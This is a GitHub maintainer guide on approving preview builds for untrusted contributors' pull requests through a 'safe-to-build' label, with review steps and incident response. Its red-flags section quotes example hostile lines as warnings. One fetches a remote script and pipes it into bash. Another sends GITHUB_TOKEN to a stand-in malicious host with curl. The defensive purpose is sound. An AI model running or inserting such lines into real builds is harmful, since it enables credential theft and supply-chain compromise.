# PR Build Approval Guide (For Maintainers)

## Overview

This guide explains how to approve PR builds for untrusted contributors.

## Trust Levels

### Auto-Build (Trusted)
These contributors get automatic builds:
- ✅ Repository owners
- ✅ Organization members  
- ✅ Repository collaborators
- ✅ Previous contributors (merged PRs)

### Requires Approval (Untrusted)
These contributors need your approval:
- ⚠️ First-time contributors
- ⚠️ External users (no prior contribution)

## Approving a PR Build

### Step 1: Review the Code

**Before approving, always review:**
- Changes to workflow files (`.github/workflows/**`)
- Changes to build scripts
- Any suspicious code patterns
- Resource usage (large files, loops, network calls)

### Step 2: Add the Label

If the PR looks safe:
1. Go to the PR page
2. Click "Labels" on the right sidebar
3. Add the `safe-to-build` label

### Step 3: Build Runs

- Workflow triggers automatically when label is added
- Build comment appears on PR when complete
- Contributors can now test the build

## Manual Build Trigger

You can also trigger builds manually for any PR:

### Via GitHub UI
1. Go to **Actions** tab
2. Select **PR Build** workflow
3. Click **Run workflow** button
4. Enter the PR number
5. Click **Run workflow**

### Via GitHub CLI
```bash
gh workflow run pr-build.yml -f pr_number=123
```

## Red Flags to Watch For

**🚨 Do NOT approve if you see:**

1. **Workflow file modifications** in first-time contributor PRs
   ```yaml
   # Suspicious: trying to modify .github/workflows/
   ```

2. **External network calls** in build scripts
   ```bash
   curl http://suspicious-site.com/script.sh | bash
   ```

3. **Resource intensive operations**
   ```bash
   # Crypto mining or similar
   while true; do compute_intensive_task; done
   ```

4. **Credential exfiltration attempts**
   ```bash
   echo $GITHUB_TOKEN > /tmp/token.txt
   curl -X POST -d @/tmp/token.txt http://malicious.com
   ```

## Creating the `safe-to-build` Label

If the label doesn't exist yet:

1. Go to **Issues** tab
2. Click **Labels**
3. Click **New label**
4. Set:
   - **Name:** `safe-to-build`
   - **Description:** `Approved for automated PR build`
   - **Color:** `#00ff00` (green) or your preference
5. Click **Create label**

## Monitoring Builds

### Check Build Status
- Go to **Actions** tab
- Look for "PR Build" workflows
- Green checkmark = success
- Red X = failed (review logs)

### Review Build Logs
1. Click on the workflow run
2. Expand each job
3. Look for errors or suspicious activity

## Cleanup

Builds auto-cleanup when:
- PR is closed
- PR is merged

You can also manually delete pre-releases:
1. Go to **Releases** page
2. Find releases tagged `pr-{number}-*`
3. Click **Delete**

## Best Practices

### For Regular Contributors
- Trust them once, mark as collaborator
- They'll get auto-builds for all future PRs

### For One-Off Contributors
- Review thoroughly before approving
- Monitor the build run
- Don't add as collaborator unless recurring

### For Suspicious PRs
- Ask questions first
- Request changes if needed
- Don't approve build until satisfied

## Troubleshooting

### Build Didn't Trigger After Adding Label

**Check:**
- Was the label name exactly `safe-to-build`?
- Did the workflow file exist on the PR branch?
- Check Actions tab for workflow runs

**Fix:**
- Remove and re-add the label
- Or use manual trigger with PR number

### Build Failed

**Common causes:**
- Compilation errors in PR code
- Missing dependencies
- Platform-specific issues

**To fix:**
- Review build logs in Actions
- Ask contributor to fix issues
- Re-run workflow after fixes

### Too Many Builds Running

**Limit concurrent builds:**
Edit `.github/workflows/pr-build.yml`:
```yaml
concurrency:
  group: pr-build-${{ github.event.pull_request.number }}
  cancel-in-progress: true
```

## Communication Templates

### Requesting Changes Before Build

```markdown
Thanks for the PR! Before I can approve a preview build, could you please:

1. Remove the changes to `.github/workflows/`
2. Explain why you need [suspicious code pattern]

Once addressed, I'll add the `safe-to-build` label to generate a preview.
```

### Approving Build

```markdown
Code looks good! I've added the `safe-to-build` label. A preview build should be ready in a few minutes.
```

### Build Failed

```markdown
The preview build failed. Please check the [workflow logs](link) and fix the compilation errors. I'll re-run the build once fixed.
```

## Security Incidents

If you discover malicious activity:

1. **Immediately:**
   - Remove `safe-to-build` label
   - Close the PR
   - Cancel running workflows

2. **Then:**
   - Delete any created releases
   - Report to GitHub (if serious)
   - Block the user if necessary

3. **Finally:**
   - Review other PRs from same user
   - Update security policies if needed

## Resources

- [GitHub Actions Security Best Practices](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [pull_request_target Documentation](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target)
- [Keeping GitHub Actions Secure](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
